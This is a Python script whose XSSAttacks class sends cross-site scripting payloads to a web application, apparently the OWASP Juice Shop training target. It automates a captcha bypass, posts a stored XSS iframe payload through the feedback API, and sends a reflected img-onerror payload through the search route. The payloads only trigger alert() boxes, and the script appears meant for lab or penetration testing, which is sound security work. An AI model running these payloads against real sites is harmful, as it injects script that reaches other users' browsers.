import logging
import requests


class XSSAttacks:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def get_captcha(self):
        try:
            response = self.session.get(f"{self.base_url}/rest/captcha/")
            if response.status_code == 200:
                return response.json()
        except:
            return None

    def test_stored_xss(self):
        payload = "<iframe src=javascript:alert('xss')>"
        captcha = self.get_captcha()
        if not captcha:
            return {"status": "failed", "error": "Captcha failed"}

        data = {
            "comment": payload,
            "rating": 1,
            "captchaId": captcha.get("captchaId", ""),  # Utilisez get() pour éviter les erreurs
            "captcha": captcha.get("answer", "")
        }

        try:
            response = self.session.post(
                f"{self.base_url}/api/Feedbacks",
                json=data
            )
            if response.status_code == 201:
                return {"status": "success"}
            else:
                return {"status": "failed", "details": response.text}
        except Exception as e:
            return {"status": "failed", "error": str(e)}


    def test_search_xss(self):
        payload = "'>\"><img src=x onerror=alert(1)>"
        try:
            response = self.session.get(f"{self.base_url}/#/search?q={payload}")
            return {"status": "success" if response.status_code == 200 else "failed"}
        except Exception:
            return {"status": "failed"}

    def run_all_xss_attacks(self):
        results = {
            "stored": self.test_stored_xss(),
            "search": self.test_search_xss()
        }
        success = any(r.get("status") == "success" for r in results.values())
        return {"status": "success" if success else "failed"}